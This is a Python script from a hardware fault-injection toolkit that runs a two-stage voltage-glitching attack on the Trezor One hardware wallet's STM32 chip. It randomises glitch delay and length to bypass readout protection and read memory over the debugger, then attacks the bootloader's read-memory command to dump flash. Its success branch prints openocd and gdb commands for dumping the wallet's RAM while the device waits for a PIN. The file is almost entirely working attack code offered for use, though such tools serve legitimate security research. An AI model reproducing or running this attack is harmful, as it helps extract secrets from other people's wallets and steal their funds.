#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE 'warning: polling failed'

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus.DebugInterface import DebugInterface
from findus import Database, PicoGlitcher, STM32Bootloader, Helper, ErrorHandling

class DerivedDebugInterface(DebugInterface):
    def characterize(self, response:str, mem:int):
        # possibly ok
        if mem is not None:
            if mem != 0x00:
                return b'success: RDP inactive'
            else:
                return b'success: read zero'
        # Expected: no connection
        elif "Error: init mode failed (unable to connect to the target)" in response:
            return b'expected: no connection'
        # Warning: Polling failed
        elif "Polling target" in response:
            return b'warning: polling failed'
        # Warning: Device lockup
        if "clearing lockup after double fault" in response:
            return b'warning: lock-up'
        # Warning: failed to read memory
        elif "Error: Failed to read memory at" in response:
            return b'warning: failed to read memory'
        # Warning: else
        elif "Warning" in response:
            return b'warning: default warning'
        # no response
        return b'error: no response'

experiment_id = 0

class Main:
    def __init__(self, args, glitcher, database):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main2
        self.glitcher = glitcher

        # trigger on the rising edge of the reset signal
        self.glitcher.rising_edge_trigger(pin_trigger='ext1')

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # set up the database
        self.database = database
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # STLink Debugger
        self.debugger = DerivedDebugInterface(target="stm32f2x")

        # unset gpio pin 4 to disable bootloader modus
        self.glitcher.set_gpio(pin_number=4, value=0)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        global experiment_id
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            self.glitcher.arm(delay, length)

            # reset target (this triggers the glitch)
            #self.glitcher.reset(0.01)
            self.glitcher.power_cycle_reset(0.2)
            #time.sleep(0.01)

            # block until glitch
            response = ""
            try:
                self.glitcher.block(timeout=1)
                memory, response = self.debugger.read_address(0x20000000)
                state = self.debugger.characterize(response=response, mem=memory)
                #print(f"Content of register: {memory}")
            except Exception as e:
                print(e)
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset()
                time.sleep(0.2)
                state = b'warning: timeout'

            # classify state
            color = self.glitcher.classify(state)

            # add to database
            state_str = str(state).encode("utf-8") + b": " + response.encode("utf-8")
            self.database.insert(experiment_id, delay, length, color, state_str)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1

            # Dump finished
            #time.sleep(0.2)
            if self.args.halt and b'success' in state:
                self.glitcher.reset(0.1)
                print("[+] Now connect the Trezor One via USB with your computer and go to the Trezor Suite app.")
                print("    Wait for the Trezor One to connect. Do not abort this script!")
                print("    If the pin input on the Trezor comes up, execute the following command to dump the memory:")
                print('    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"')
                print("    Connect to openocd via gdb or telnet:")
                print("    $ telnet localhost 4444")
                print("    $ arm-none-eabi-gdb")
                print("    (gdb) target remote :3333")
                print("    (gdb) monitor reset halt")
                print("    (gdb) continue")
                print("    Or dump the RAM as is with the following command:")
                print('    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"')
                while True:
                    time.sleep(0.1)

            if self.args.readmemory and b'success' in state:
                # hand execution over to Main2
                break

class Main2:
    def __init__(self, args, glitcher, database):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main
        self.glitcher = glitcher

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # set up the database
        self.database = database
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # memory read settings
        self.bootcom = STM32Bootloader(port=self.args.target, serial_timeout=0.1, dump_address=0x08000000, dump_len=0x2000)
        self.dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

        # error handling
        self.error_handler = ErrorHandling(max_fails=10, look_back=30, database=self.database)

        # set gpio pin 4 to enable bootloader modus
        self.glitcher.set_gpio(pin_number=4, value=1)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay2[0]
        e_delay = self.args.delay2[1]
        s_length = self.args.length2[0]
        e_length = self.args.length2[1]

        global experiment_id
        experiment_id_start = experiment_id
        run = True
        while run:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # flush if necessary
            self.bootcom.flush_v2(timeout=0.1)

            # arm
            #self.glitcher.arm(delay, length)

            # reset target
            self.glitcher.reset(0.01)
            time.sleep(0.1)

            # setup bootloader communication
            state = self.bootcom.init_bootloader()
            # setup memory read; this function triggers the glitch
            if b'ok' in state:
                state = self.bootcom.setup_memread()

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                #self.glitcher.power_cycle_target()
                time.sleep(0.2)
                state = b'warning: timeout'

            # dump memory
            mem = b''
            if b'success' in state:
                #response, mem = self.bootcom.dump_memory_to_file(self.dump_filename)
                start = 0x08000000
                size = 0xFF
                state, mem = self.bootcom.read_memory(start, size)

            # classify response
            color = self.glitcher.classify(state)

            # add to database
            state_str = state + mem
            self.database.insert(experiment_id, delay, length, color, state_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state_str}", color))

            # check for successive errors, re-programm target if too many successive errors occur.
            def error_action():
                # go back to the first stage
                global run
                run = False
            self.error_handler.check(experiment_id=experiment_id, response=state, expected=b'expected', user_action=error_action)

            # increase experiment id
            experiment_id += 1
            if experiment_id >= experiment_id_start + 10:
                while True:
                    time.sleep(1)

            # Dump finished
            if state == b'success: dump finished':
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay2", required=True, nargs=2, help="delay for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--length2", required=True, nargs=2, help="length for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--halt", required=False, action='store_true', help="halt execution if successful glitch is detected. This should be sufficient for firmware version 1.6.0 of the Trezor One.")
    parser.add_argument("--readmemory", required=False, action='store_true', help="Continue with an attack on the bootloader readmemory command (stage 2). If you have a Trezor One with firmware version 1.6.1 and later, this second stage is mandatory.")
    args = parser.parse_args()

    # init the glitcher and hand it over to main
    glitcher = PicoGlitcher()
    glitcher.init(port=args.rpico)

    # set up database for both stages
    database = Database(sys.argv, resume=args.resume, nostore=args.no_store)

    while True:
        main = Main(args, glitcher, database)
        try:
            main.run()
        except KeyboardInterrupt:
            print("\nExitting...")
            sys.exit(1)

        main2 = Main2(args, glitcher, database)
        try:
            main2.run()
        except KeyboardInterrupt:
            print("\nExitting...")
            sys.exit(1)
